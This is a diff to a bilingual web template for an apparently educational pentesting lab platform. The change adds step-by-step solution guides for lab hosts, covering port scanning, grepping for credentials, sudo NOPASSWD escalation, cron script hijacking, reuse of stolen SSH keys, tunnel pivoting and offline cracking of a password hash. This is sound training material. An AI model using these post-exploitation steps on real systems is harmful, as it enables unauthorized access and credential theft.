@@ -8,7 +8,7 @@
     <div class="lang-content" data-lang="es">
       {% if host_lab_id == 'host_enum' %}<h2 class="text-lg font-semibold mb-2">Reconocimiento de red y servicios</h2><p class="text-sm text-gray-400">Realiza una enumeración externa desde Kali. Identifica puertos, servicios y versiones antes de intentar obtener acceso.</p>
       {% elif host_lab_id == 'credential_hunting' %}<h2 class="text-lg font-semibold mb-2">Búsqueda de credenciales desde una shell</h2><p class="text-sm text-gray-400">Parte de una shell obtenida en H03. Revisa configuraciones, variables, historiales y copias de seguridad accesibles por el usuario comprometido.</p>
-      {% elif host_lab_id == 'sudo_suid' %}<h2 class="text-lg font-semibold mb-2">Abuso de SUID y capabilities</h2><p class="text-sm text-gray-400">Enumera los límites de privilegios desde la shell y explota un binario inseguro para obtener root.</p>
+      {% elif host_lab_id == 'sudo_suid' %}<h2 class="text-lg font-semibold mb-2">Abuso de sudo mal configurado</h2><p class="text-sm text-gray-400">Enumera los permisos de sudo de la cuenta comprometida y aprovecha una entrada <code>NOPASSWD: ALL</code> para escalar directamente a root.</p>
       {% elif host_lab_id == 'cron_persistence' %}<h2 class="text-lg font-semibold mb-2">Persistencia mediante cron</h2><p class="text-sm text-gray-400">Localiza una tarea ejecutada por root cuyo script sea modificable y abusa de ella para recuperar un artefacto protegido.</p>
       {% elif host_lab_id == 'ssh_lateral' %}<h2 class="text-lg font-semibold mb-2">Claves SSH y movimiento lateral</h2><p class="text-sm text-gray-400">Busca claves privadas abandonadas, identifica su propietario y reutilízalas para acceder a otra identidad del sistema.</p>
       {% elif host_lab_id == 'network_pivoting' %}<h2 class="text-lg font-semibold mb-2">Pivoting y túneles SSH</h2><p class="text-sm text-gray-400">Descubre un servicio ligado únicamente a loopback y crea un túnel desde Kali para alcanzarlo.</p>
@@ -17,7 +17,7 @@
     <div class="lang-content" data-lang="en" style="display:none">
       {% if host_lab_id == 'host_enum' %}<h2 class="text-lg font-semibold mb-2">Network and service reconnaissance</h2><p class="text-sm text-gray-400">Perform external enumeration from Kali. Identify ports, services and versions before attempting access.</p>
       {% elif host_lab_id == 'credential_hunting' %}<h2 class="text-lg font-semibold mb-2">Credential hunting from a shell</h2><p class="text-sm text-gray-400">Start from a shell obtained in H03. Inspect configurations, environment files, histories and backups readable by the compromised user.</p>
-      {% elif host_lab_id == 'sudo_suid' %}<h2 class="text-lg font-semibold mb-2">SUID and capabilities abuse</h2><p class="text-sm text-gray-400">Enumerate privilege boundaries from the shell and abuse an unsafe binary to obtain root.</p>
+      {% elif host_lab_id == 'sudo_suid' %}<h2 class="text-lg font-semibold mb-2">Sudo misconfiguration abuse</h2><p class="text-sm text-gray-400">Enumerate the compromised account's sudo rights and abuse a <code>NOPASSWD: ALL</code> entry to escalate straight to root.</p>
       {% elif host_lab_id == 'cron_persistence' %}<h2 class="text-lg font-semibold mb-2">Persistence through cron</h2><p class="text-sm text-gray-400">Find a root-owned scheduled task whose script is writable and abuse it to recover a protected artifact.</p>
       {% elif host_lab_id == 'ssh_lateral' %}<h2 class="text-lg font-semibold mb-2">SSH keys and lateral movement</h2><p class="text-sm text-gray-400">Hunt for abandoned private keys, identify their owner and reuse them to access another system identity.</p>
       {% elif host_lab_id == 'network_pivoting' %}<h2 class="text-lg font-semibold mb-2">SSH pivoting and tunneling</h2><p class="text-sm text-gray-400">Discover a loopback-only service and create a tunnel from Kali to reach it.</p>
@@ -30,6 +30,8 @@
     {% if host_lab_id == 'host_enum' %}<pre><code class="language-bash">nmap -Pn -p- --min-rate 2000 {{ target_ip }}
 nmap -Pn -sC -sV -p 21,22,80,445 {{ target_ip }}
 printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21</code></pre>
+    {% elif host_lab_id == 'sudo_suid' %}<pre><code class="language-bash">ssh admin@{{ target_ip }}
+sudo -l</code></pre>
     {% elif host_lab_id == 'database_access' %}<pre><code class="language-bash">ssh admin@{{ target_ip }}
 find /opt -type f \( -name '.env' -o -name '*.db' \) -readable 2>/dev/null</code></pre>
     {% else %}<pre><code class="language-bash"># Reutiliza el acceso obtenido durante H02/H03
@@ -58,29 +60,255 @@ hostname</code></pre>{% endif %}
   <div id="resolution-data" class="hidden">
     <div class="lang-content" data-lang="es">
       {% if host_lab_id == 'host_enum' %}
-      <h3>Guía completa — Enumeración</h3><ol><li>Comprueba conectividad con <code>ping -c 1 {{ target_ip }}</code>. Si ICMP está filtrado, continúa con <code>-Pn</code>.</li><li>Escanea todos los puertos TCP: <code>nmap -Pn -p- --min-rate 2000 {{ target_ip }}</code>.</li><li>Ejecuta scripts por defecto y detección de versión: <code>nmap -Pn -sC -sV -p 21,22,80,445 {{ target_ip }}</code>.</li><li>Nmap puede agrupar varias versiones de vsftpd. Conecta directamente al servicio con <code>printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21</code> para recoger su banner exacto.</li><li>Responde con el producto y la versión que aparecen en la línea <code>220</code>.</li></ol>
+      <h3>Guía completa — Enumeración de red y servicios</h3>
+      <ol>
+        <li>Comprueba conectividad con el objetivo (usa <code>-Pn</code> si ICMP está filtrado):
+          <pre><code class="language-bash">ping -c 1 {{ target_ip }}</code></pre></li>
+        <li>Escanea todos los puertos TCP para no perderte servicios en puertos altos:
+          <pre><code class="language-bash">nmap -Pn -p- --min-rate 2000 {{ target_ip }}</code></pre></li>
+        <li>Lanza scripts por defecto y detección de versión sobre los puertos abiertos:
+          <pre><code class="language-bash">nmap -Pn -sC -sV -p 21,22,80,445 {{ target_ip }}</code></pre></li>
+        <li>Nmap agrupa varias versiones de vsftpd bajo un mismo banner genérico. Conecta directamente al servicio para leer su banner exacto:
+          <pre><code class="language-bash">printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21</code></pre></li>
+        <li>Completa el mapa del objetivo revisando también SMB y HTTP:
+          <pre><code class="language-bash">smbclient -N -L //{{ target_ip }}/
+curl -sI {{ target_base }}/</code></pre></li>
+        <li>Responde con el producto y la versión exactos que aparecen en la línea <code>220</code> del banner FTP.</li>
+      </ol>
       {% elif host_lab_id == 'credential_hunting' %}
-      <h3>Guía completa — Credential Hunting</h3><ol><li>Entra con la shell obtenida previamente y confirma el usuario con <code>id</code>.</li><li>Busca configuraciones: <code>find /opt /var/www /home -type f \( -name '.env' -o -name '*.conf' -o -name '*history*' \) -readable 2>/dev/null</code>.</li><li>Busca secretos: <code>grep -RniE 'password|secret|token|key|marker' /opt /home 2>/dev/null</code>.</li><li>Inspecciona los ficheros relevantes y recupera el marcador del propio sistema.</li></ol>
+      <h3>Guía completa — Credential Hunting</h3>
+      <ol>
+        <li>Conéctate con la shell obtenida en H02/H03 y confirma tu identidad:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+id
+whoami</code></pre></li>
+        <li>Busca ficheros de configuración, variables de entorno e historiales legibles fuera de tu propio home:
+          <pre><code class="language-bash">find /opt /var/www /home -type f \( -name '.env' -o -name '*.conf' -o -name '*history*' \) -readable 2>/dev/null</code></pre></li>
+        <li>Filtra su contenido en busca de credenciales, tokens y rutas sensibles:
+          <pre><code class="language-bash">grep -RniE 'password|secret|token|key|marker' /opt /home 2>/dev/null</code></pre></li>
+        <li>Inspecciona el fichero de configuración de producción localizado:
+          <pre><code class="language-bash">cat /opt/hacklabs/app/.env</code></pre></li>
+        <li>El fichero revela, entre otras cosas, la ruta de la base de datos, la ubicación de una clave SSH de backups y el marcador de este laboratorio. Valídalo en la caja «Validar Flag».</li>
+      </ol>
       {% elif host_lab_id == 'sudo_suid' %}
-      <h3>Guía completa — SUID y capabilities</h3><ol><li>Enumera sudo con <code>sudo -l</code>.</li><li>Lista SUID: <code>find / -perm -4000 -type f 2>/dev/null</code>.</li><li>Comprueba capabilities: <code>getcap -r / 2>/dev/null</code>.</li><li>Contrasta el binario anómalo con GTFOBins y úsalo para ejecutar una shell privilegiada.</li><li>Verifica <code>id</code> y lee el artefacto H07 dentro de <code>/root/host-labs/</code>.</li></ol>
+      <h3>Guía completa — Abuso de sudo mal configurado</h3>
+      <ol>
+        <li>Conéctate con la shell de <code>admin</code> (obtenida en H02/H03) y comprueba qué puede ejecutar con privilegios:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+sudo -l</code></pre></li>
+        <li>El resultado muestra <code>(ALL) NOPASSWD: ALL</code>: <code>admin</code> puede ejecutar <strong>cualquier</strong> comando como root sin necesidad de contraseña. Es una de las configuraciones de <code>sudoers</code> más peligrosas — y, por desgracia, más habituales en entornos reales.</li>
+        <li>Abre una shell interactiva como root directamente:
+          <pre><code class="language-bash">sudo -i
+id</code></pre></li>
+        <li>Lee el artefacto protegido que solo root puede leer:
+          <pre><code class="language-bash">cat /root/host-labs/h07.txt</code></pre></li>
+        <li>Lección de auditoría real: tras cualquier acceso inicial, <code>sudo -l</code> es de los primeros comandos que debe ejecutar un pentester — una entrada <code>NOPASSWD: ALL</code> equivale a acceso root inmediato, sin necesidad de exploits.</li>
+      </ol>
       {% elif host_lab_id == 'cron_persistence' %}
-      <h3>Guía completa — Persistencia por cron</h3><ol><li>Enumera <code>/etc/crontab</code> y <code>/etc/cron.d/</code>.</li><li>Identifica scripts ejecutados por root y revisa sus permisos.</li><li>Añade al script modificable una orden que copie el artefacto H08 desde <code>/root/host-labs/</code> a <code>/tmp</code> y le asigne permisos de lectura.</li><li>Espera una ejecución, comprueba propietario/fecha y lee el resultado.</li><li>Restaura el script para no afectar intentos posteriores.</li></ol>
+      <h3>Guía completa — Persistencia por cron</h3>
+      <ol>
+        <li>Conéctate y enumera las tareas programadas del sistema:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+cat /etc/crontab
+ls -la /etc/cron.d/
+cat /etc/cron.d/hacklabs-telemetry</code></pre></li>
+        <li>La tarea se ejecuta como root cada minuto e invoca un script. Comprueba sus permisos:
+          <pre><code class="language-bash">ls -la /opt/hostlabs/telemetry.sh
+cat /opt/hostlabs/telemetry.sh</code></pre></li>
+        <li>El script pertenece a root pero es escribible por cualquier usuario (<code>777</code>). Añádele una orden que copie el artefacto protegido a una ruta legible por ti:
+          <pre><code class="language-bash">echo 'cp /root/host-labs/h08.txt /tmp/h08-proof.txt; chmod 644 /tmp/h08-proof.txt' >> /opt/hostlabs/telemetry.sh</code></pre></li>
+        <li>Espera a la siguiente ejecución de cron (se dispara cada minuto) y lee el resultado:
+          <pre><code class="language-bash">sleep 65
+cat /tmp/h08-proof.txt</code></pre></li>
+        <li>Restaura el script a su estado original para no interferir con otros intentos:
+          <pre><code class="language-bash">cat > /opt/hostlabs/telemetry.sh << 'EOF'
+#!/bin/sh
+find /var/log -type f -name '*.log' -mtime +30 -delete 2>/dev/null
+EOF</code></pre></li>
+      </ol>
       {% elif host_lab_id == 'ssh_lateral' %}
-      <h3>Guía completa — Movimiento lateral SSH</h3><ol><li>Busca claves: <code>find /opt /home -type f \( -name 'id_rsa' -o -name 'id_ed25519' \) -readable 2>/dev/null</code>.</li><li>Copia la clave a <code>/tmp</code> y aplica <code>chmod 600</code>.</li><li>Deriva la pública con <code>ssh-keygen -y</code> y busca su presencia en <code>authorized_keys</code>.</li><li>Conecta como la identidad asociada contra <code>{{ target_ip }}</code>.</li><li>Enumera el nuevo home y lee el marcador lateral.</li></ol>
+      <h3>Guía completa — Movimiento lateral por claves SSH</h3>
+      <ol>
+        <li>Conéctate como <code>admin</code> y busca claves privadas legibles fuera de tu propio home:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+find /opt /home -type f \( -name 'id_rsa' -o -name 'id_ed25519' \) -readable 2>/dev/null</code></pre></li>
+        <li>Copia la clave localizada y ajusta sus permisos (SSH rechaza claves con permisos demasiado abiertos):
+          <pre><code class="language-bash">cp /opt/backups/.ssh/id_rsa /tmp/backup_key
+chmod 600 /tmp/backup_key</code></pre></li>
+        <li>Deriva su clave pública para identificar a qué cuenta pertenece:
+          <pre><code class="language-bash">ssh-keygen -y -f /tmp/backup_key</code></pre></li>
+        <li>Confirma que esa clave pública está autorizada en otra cuenta del sistema:
+          <pre><code class="language-bash">cat /home/svc-backup/.ssh/authorized_keys</code></pre></li>
+        <li>Usa la clave para autenticarte directamente como esa identidad:
+          <pre><code class="language-bash">ssh -i /tmp/backup_key svc-backup@{{ target_ip }}
+id</code></pre></li>
+        <li>Enumera el nuevo home y recupera el marcador de movimiento lateral:
+          <pre><code class="language-bash">cat lateral.txt</code></pre></li>
+      </ol>
       {% elif host_lab_id == 'network_pivoting' %}
-      <h3>Guía completa — Pivoting</h3><ol><li>Desde la shell ejecuta <code>ss -lntp</code> y localiza el servicio que escucha solo en <code>127.0.0.1:9090</code>.</li><li>Confirma desde Kali que <code>curl http://{{ target_ip }}:9090</code> no es alcanzable.</li><li>Crea el túnel: <code>ssh -N -L 9090:127.0.0.1:9090 admin@{{ target_ip }}</code>.</li><li>En otra terminal usa <code>curl http://127.0.0.1:9090/</code>.</li><li>El contenido recuperado a través del túnel contiene el marcador.</li></ol>
+      <h3>Guía completa — Pivoting mediante túnel SSH</h3>
+      <ol>
+        <li>Conéctate y busca servicios que solo escuchan en localhost:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+ss -lntp</code></pre></li>
+        <li>Verás un servicio en <code>127.0.0.1:9090</code>, inalcanzable desde fuera del host. Confírmalo desde Kali:
+          <pre><code class="language-bash">curl --connect-timeout 3 http://{{ target_ip }}:9090/</code></pre></li>
+        <li>Cierra esa sesión interactiva y abre en su lugar un túnel local que reenvíe ese puerto a tu máquina:
+          <pre><code class="language-bash">ssh -N -L 9090:127.0.0.1:9090 admin@{{ target_ip }}</code></pre></li>
+        <li>En una segunda terminal de Kali, accede ahora al servicio a través del túnel:
+          <pre><code class="language-bash">curl http://127.0.0.1:9090/</code></pre></li>
+        <li>El contenido devuelto, accesible únicamente a través del túnel, contiene el marcador del laboratorio.</li>
+      </ol>
       {% else %}
-      <h3>Guía completa — Acceso a base de datos</h3><ol><li>Obtén una shell como <code>admin</code> usando H03 y busca ficheros <code>.env</code> legibles.</li><li>Extrae la ruta y el motor de base de datos desde la configuración.</li><li>Conecta con <code>sqlite3 RUTA_DB</code> y ejecuta <code>.tables</code>, <code>.schema users</code> y <code>SELECT username,password_hash,role FROM users;</code>.</li><li>Copia únicamente el hash de <code>administrator</code> a Kali.</li><li>Obtén la wordlist corporativa encontrada durante la enumeración y ejecuta <code>hashcat -m 0 hash.txt company-passwords.txt</code>.</li><li>Introduce la contraseña recuperada; no introduzcas el hash.</li></ol>
+      <h3>Guía completa — Acceso a base de datos</h3>
+      <ol>
+        <li>Obtén una shell como <code>admin</code> (H02/H03) y localiza la configuración de producción:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+find /opt -type f \( -name '.env' -o -name '*.db' \) -readable 2>/dev/null
+cat /opt/hacklabs/app/.env</code></pre></li>
+        <li>El fichero indica el motor (SQLite) y la ruta de la base de datos. Conéctate y enumera las tablas:
+          <pre><code class="language-bash">sqlite3 /opt/hacklabs-db/production.db
+.tables
+.schema users</code></pre></li>
+        <li>Consulta las credenciales almacenadas:
+          <pre><code class="language-bash">SELECT username, password_hash, role FROM users;
+.quit</code></pre></li>
+        <li>Copia a tu Kali la wordlist corporativa encontrada durante la fase de enumeración:
+          <pre><code class="language-bash">exit
+scp admin@{{ target_ip }}:/opt/hacklabs/app/company-passwords.txt ./company-passwords.txt</code></pre></li>
+        <li>Guarda el hash MD5 devuelto por la consulta anterior (el de <code>administrator</code>) y crackéalo offline con la wordlist:
+          <pre><code class="language-bash">echo '&lt;HASH_DEVUELTO_POR_LA_CONSULTA&gt;' > hash.txt
+hashcat -m 0 -a 0 hash.txt company-passwords.txt
+hashcat -m 0 hash.txt --show</code></pre></li>
+        <li>Introduce la <strong>contraseña en claro</strong> recuperada como respuesta; no introduzcas el hash.</li>
+      </ol>
       {% endif %}
     </div>
     <div class="lang-content" data-lang="en" style="display:none">
-      {% if host_lab_id == 'host_enum' %}<h3>Full guide — Enumeration</h3><ol><li>Check connectivity with <code>ping -c 1 {{ target_ip }}</code>. Continue with <code>-Pn</code> if ICMP is filtered.</li><li>Scan every TCP port with <code>nmap -Pn -p- --min-rate 2000 {{ target_ip }}</code>.</li><li>Run default scripts and version detection with <code>nmap -Pn -sC -sV -p 21,22,80,445 {{ target_ip }}</code>.</li><li>Nmap may group multiple vsftpd releases. Collect the exact service banner with <code>printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21</code>.</li><li>Submit the product and version shown on the <code>220</code> line.</li></ol>
-      {% elif host_lab_id == 'credential_hunting' %}<h3>Full guide — Credential Hunting</h3><ol><li>Enter through the shell obtained earlier and confirm the account with <code>id</code>.</li><li>Find readable configuration and history files: <code>find /opt /var/www /home -type f \( -name '.env' -o -name '*.conf' -o -name '*history*' \) -readable 2&gt;/dev/null</code>.</li><li>Search their contents with <code>grep -RniE 'password|secret|token|key|marker' /opt /home 2&gt;/dev/null</code>.</li><li>Inspect the relevant production file and recover the marker from the host itself.</li></ol>
-      {% elif host_lab_id == 'sudo_suid' %}<h3>Full guide — SUID and capabilities</h3><ol><li>Inspect delegated commands with <code>sudo -l</code>.</li><li>Enumerate SUID files using <code>find / -perm -4000 -type f 2&gt;/dev/null</code>.</li><li>Enumerate Linux capabilities using <code>getcap -r / 2&gt;/dev/null</code>.</li><li>Compare the anomalous binary against GTFOBins and use the applicable primitive to obtain a privileged shell.</li><li>Verify the new identity with <code>id</code>, then read the H07 artifact under <code>/root/host-labs/</code>.</li></ol>
-      {% elif host_lab_id == 'cron_persistence' %}<h3>Full guide — Cron persistence</h3><ol><li>Enumerate <code>/etc/crontab</code> and <code>/etc/cron.d/</code>.</li><li>Identify jobs run by root and inspect the permissions of every referenced script.</li><li>Append a command to the writable script that copies the protected H08 artifact from <code>/root/host-labs/</code> to <code>/tmp</code> and makes the copy readable.</li><li>Wait for the next cron execution, then verify its owner and timestamp before reading it.</li><li>Restore the script so later attempts are unaffected.</li></ol>
-      {% elif host_lab_id == 'ssh_lateral' %}<h3>Full guide — SSH lateral movement</h3><ol><li>Find readable keys with <code>find /opt /home -type f \( -name 'id_rsa' -o -name 'id_ed25519' \) -readable 2&gt;/dev/null</code>.</li><li>Copy the private key to <code>/tmp</code> and apply <code>chmod 600</code>.</li><li>Derive its public key with <code>ssh-keygen -y</code> and match it to an <code>authorized_keys</code> entry to identify the account.</li><li>Connect as that identity to <code>{{ target_ip }}</code>.</li><li>Enumerate the new home and recover the lateral-movement marker.</li></ol>
-      {% elif host_lab_id == 'network_pivoting' %}<h3>Full guide — Pivoting</h3><ol><li>Run <code>ss -lntp</code> from the compromised shell and identify the service bound only to <code>127.0.0.1:9090</code>.</li><li>Verify from Kali that <code>curl http://{{ target_ip }}:9090</code> is not directly reachable.</li><li>Create a local forward with <code>ssh -N -L 9090:127.0.0.1:9090 admin@{{ target_ip }}</code>.</li><li>In a second Kali terminal, request <code>curl http://127.0.0.1:9090/</code>.</li><li>Recover the marker returned exclusively through the tunnel.</li></ol>
-      {% else %}<h3>Full guide — Database access</h3><ol><li>Obtain an <code>admin</code> shell through H03 and find readable <code>.env</code> files.</li><li>Extract the production database engine and path from the configuration.</li><li>Connect using <code>sqlite3 DATABASE_PATH</code>, then run <code>.tables</code>, <code>.schema users</code> and <code>SELECT username,password_hash,role FROM users;</code>.</li><li>Copy only the <code>administrator</code> hash to Kali.</li><li>Retrieve the corporate wordlist found during enumeration and run <code>hashcat -m 0 hash.txt company-passwords.txt</code>.</li><li>Submit the recovered plaintext password, not the hash.</li></ol>{% endif %}
+      {% if host_lab_id == 'host_enum' %}
+      <h3>Full guide — Network and service enumeration</h3>
+      <ol>
+        <li>Check connectivity with the target (use <code>-Pn</code> if ICMP is filtered):
+          <pre><code class="language-bash">ping -c 1 {{ target_ip }}</code></pre></li>
+        <li>Scan every TCP port so you don't miss services on high ports:
+          <pre><code class="language-bash">nmap -Pn -p- --min-rate 2000 {{ target_ip }}</code></pre></li>
+        <li>Run default scripts and version detection against the open ports:
+          <pre><code class="language-bash">nmap -Pn -sC -sV -p 21,22,80,445 {{ target_ip }}</code></pre></li>
+        <li>Nmap groups multiple vsftpd releases under the same generic banner. Connect directly to the service to read its exact banner:
+          <pre><code class="language-bash">printf 'QUIT\r\n' | nc -nv {{ target_ip }} 21</code></pre></li>
+        <li>Complete the picture by checking SMB and HTTP too:
+          <pre><code class="language-bash">smbclient -N -L //{{ target_ip }}/
+curl -sI {{ target_base }}/</code></pre></li>
+        <li>Submit the exact product and version shown on the <code>220</code> line of the FTP banner.</li>
+      </ol>
+      {% elif host_lab_id == 'credential_hunting' %}
+      <h3>Full guide — Credential Hunting</h3>
+      <ol>
+        <li>Connect with the shell obtained in H02/H03 and confirm your identity:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+id
+whoami</code></pre></li>
+        <li>Find readable configuration, environment and history files outside your own home:
+          <pre><code class="language-bash">find /opt /var/www /home -type f \( -name '.env' -o -name '*.conf' -o -name '*history*' \) -readable 2>/dev/null</code></pre></li>
+        <li>Search their contents for credentials, tokens and sensitive paths:
+          <pre><code class="language-bash">grep -RniE 'password|secret|token|key|marker' /opt /home 2>/dev/null</code></pre></li>
+        <li>Inspect the production configuration file you found:
+          <pre><code class="language-bash">cat /opt/hacklabs/app/.env</code></pre></li>
+        <li>The file reveals, among other things, the database path, the location of a backup SSH key, and this lab's marker. Validate it in the «Validate Flag» box.</li>
+      </ol>
+      {% elif host_lab_id == 'sudo_suid' %}
+      <h3>Full guide — Sudo misconfiguration abuse</h3>
+      <ol>
+        <li>Connect with the <code>admin</code> shell (obtained in H02/H03) and check what it can run with elevated rights:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+sudo -l</code></pre></li>
+        <li>The output shows <code>(ALL) NOPASSWD: ALL</code>: <code>admin</code> can run <strong>any</strong> command as root without a password. This is one of the most dangerous — and unfortunately common — sudoers misconfigurations found in real environments.</li>
+        <li>Open a root interactive shell directly:
+          <pre><code class="language-bash">sudo -i
+id</code></pre></li>
+        <li>Read the protected artifact that only root can read:
+          <pre><code class="language-bash">cat /root/host-labs/h07.txt</code></pre></li>
+        <li>Real audit takeaway: after any initial access, <code>sudo -l</code> is one of the first commands a pentester should run — a <code>NOPASSWD: ALL</code> entry is equivalent to immediate root access, no exploit required.</li>
+      </ol>
+      {% elif host_lab_id == 'cron_persistence' %}
+      <h3>Full guide — Cron persistence</h3>
+      <ol>
+        <li>Connect and enumerate the system's scheduled tasks:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+cat /etc/crontab
+ls -la /etc/cron.d/
+cat /etc/cron.d/hacklabs-telemetry</code></pre></li>
+        <li>The job runs as root every minute and invokes a script. Check its permissions:
+          <pre><code class="language-bash">ls -la /opt/hostlabs/telemetry.sh
+cat /opt/hostlabs/telemetry.sh</code></pre></li>
+        <li>The script is owned by root but writable by any user (<code>777</code>). Append a command that copies the protected artifact to a path you can read:
+          <pre><code class="language-bash">echo 'cp /root/host-labs/h08.txt /tmp/h08-proof.txt; chmod 644 /tmp/h08-proof.txt' >> /opt/hostlabs/telemetry.sh</code></pre></li>
+        <li>Wait for the next cron execution (it fires every minute) and read the result:
+          <pre><code class="language-bash">sleep 65
+cat /tmp/h08-proof.txt</code></pre></li>
+        <li>Restore the script to its original state so it doesn't interfere with later attempts:
+          <pre><code class="language-bash">cat > /opt/hostlabs/telemetry.sh << 'EOF'
+#!/bin/sh
+find /var/log -type f -name '*.log' -mtime +30 -delete 2>/dev/null
+EOF</code></pre></li>
+      </ol>
+      {% elif host_lab_id == 'ssh_lateral' %}
+      <h3>Full guide — SSH key lateral movement</h3>
+      <ol>
+        <li>Connect as <code>admin</code> and find readable private keys outside your own home:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+find /opt /home -type f \( -name 'id_rsa' -o -name 'id_ed25519' \) -readable 2>/dev/null</code></pre></li>
+        <li>Copy the key you found and fix its permissions (SSH rejects keys with overly open permissions):
+          <pre><code class="language-bash">cp /opt/backups/.ssh/id_rsa /tmp/backup_key
+chmod 600 /tmp/backup_key</code></pre></li>
+        <li>Derive its public key to identify which account it belongs to:
+          <pre><code class="language-bash">ssh-keygen -y -f /tmp/backup_key</code></pre></li>
+        <li>Confirm that public key is authorized on another account of the system:
+          <pre><code class="language-bash">cat /home/svc-backup/.ssh/authorized_keys</code></pre></li>
+        <li>Use the key to authenticate directly as that identity:
+          <pre><code class="language-bash">ssh -i /tmp/backup_key svc-backup@{{ target_ip }}
+id</code></pre></li>
+        <li>Enumerate the new home and recover the lateral-movement marker:
+          <pre><code class="language-bash">cat lateral.txt</code></pre></li>
+      </ol>
+      {% elif host_lab_id == 'network_pivoting' %}
+      <h3>Full guide — SSH tunnel pivoting</h3>
+      <ol>
+        <li>Connect and look for services that only listen on localhost:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+ss -lntp</code></pre></li>
+        <li>You'll see a service on <code>127.0.0.1:9090</code>, unreachable from outside the host. Confirm it from Kali:
+          <pre><code class="language-bash">curl --connect-timeout 3 http://{{ target_ip }}:9090/</code></pre></li>
+        <li>Close that interactive session and open a local forward instead, tunneling that port to your machine:
+          <pre><code class="language-bash">ssh -N -L 9090:127.0.0.1:9090 admin@{{ target_ip }}</code></pre></li>
+        <li>In a second Kali terminal, request the service through the tunnel:
+          <pre><code class="language-bash">curl http://127.0.0.1:9090/</code></pre></li>
+        <li>The content returned, reachable only through the tunnel, contains the lab's marker.</li>
+      </ol>
+      {% else %}
+      <h3>Full guide — Database access</h3>
+      <ol>
+        <li>Obtain an <code>admin</code> shell (H02/H03) and locate the production configuration:
+          <pre><code class="language-bash">ssh admin@{{ target_ip }}
+find /opt -type f \( -name '.env' -o -name '*.db' \) -readable 2>/dev/null
+cat /opt/hacklabs/app/.env</code></pre></li>
+        <li>The file states the engine (SQLite) and the database path. Connect and enumerate the tables:
+          <pre><code class="language-bash">sqlite3 /opt/hacklabs-db/production.db
+.tables
+.schema users</code></pre></li>
+        <li>Query the stored credentials:
+          <pre><code class="language-bash">SELECT username, password_hash, role FROM users;
+.quit</code></pre></li>
+        <li>Copy the corporate wordlist you found during enumeration to your Kali box:
+          <pre><code class="language-bash">exit
+scp admin@{{ target_ip }}:/opt/hacklabs/app/company-passwords.txt ./company-passwords.txt</code></pre></li>
+        <li>Save the MD5 hash returned by the query above (the <code>administrator</code> one) and crack it offline with the wordlist:
+          <pre><code class="language-bash">echo '&lt;HASH_RETURNED_BY_THE_QUERY&gt;' > hash.txt
+hashcat -m 0 -a 0 hash.txt company-passwords.txt
+hashcat -m 0 hash.txt --show</code></pre></li>
+        <li>Submit the recovered <strong>plaintext password</strong> as the answer, not the hash.</li>
+      </ol>
+      {% endif %}
     </div>
   </div>
 </div>
